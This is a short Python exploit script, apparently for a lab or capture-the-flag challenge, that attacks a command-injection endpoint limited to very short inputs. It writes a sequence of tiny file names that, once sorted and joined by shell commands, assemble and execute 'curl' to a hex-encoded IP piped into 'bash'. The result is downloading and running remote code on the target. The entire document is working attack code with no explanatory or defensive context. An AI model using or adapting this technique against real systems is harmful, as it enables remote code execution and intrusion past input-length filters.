#encoding:utf-8
import time
import requests
baseurl = "http://192.168.120.49:18080/class09/4ls/index.php?cmd="
s = requests.session()

# 将ls -t 写入文件g
list=[
    ">g\;",
    ">g\>",
    ">ht-",
    ">sl",
    ">dir",
    "*>v",
    ">rev",
    "*v>x"
]

# curl 192.168.120.49|bash
list2= [
    ">ash",
    ">b\\",
    '>\|\\',
    '>31\\',
    '>78\\',
    '>A8\\',
    '>C0\\',
    '>0x\\',
    '>\ \\',
    '>rl\\',
    '>cu\\'
]
for i in list:
    time.sleep(1)
    url = baseurl+str(i)
    s.get(url)

for j in list2:
    time.sleep(1)
    url = baseurl+str(j)
    s.get(url)

s.get(baseurl+"sh x")
s.get(baseurl+"sh g")
